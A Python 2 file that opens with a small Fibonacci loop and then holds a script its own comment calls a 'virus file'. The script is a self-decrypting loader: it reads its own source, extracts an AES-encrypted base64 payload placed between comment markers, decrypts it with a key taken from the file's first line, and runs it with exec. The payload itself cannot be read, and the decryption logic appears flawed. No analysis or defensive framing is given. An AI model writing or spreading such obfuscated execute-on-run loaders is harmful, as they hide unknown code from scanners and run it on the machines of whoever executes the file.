parents, babies = (1, 1)
while babies < 100:
    print 'This generation has {0} babies'.format(babies)
    parents, babies = (babies, parents + babies)
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload